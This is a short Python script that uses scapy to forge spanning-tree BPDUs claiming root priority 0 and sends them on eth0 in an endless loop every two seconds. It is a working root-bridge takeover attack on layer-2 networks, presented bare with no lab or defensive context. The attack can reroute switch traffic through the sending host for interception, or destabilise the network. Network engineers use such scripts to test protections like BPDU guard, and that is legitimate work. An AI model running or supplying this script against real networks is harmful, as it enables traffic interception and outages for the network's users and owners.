#!/usr/bin/env python3
from scapy.all import *

interface = "eth0"

bpdu = Ether(dst="01:80:c2:00:00:00", src="aa:bb:cc:dd:ee:ff") / \
       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
       STP(rootid=0x0001, bridgeid=0x0001, portid=0x8001, priority=0)

sendp(bpdu, iface=interface, loop=1, inter=2)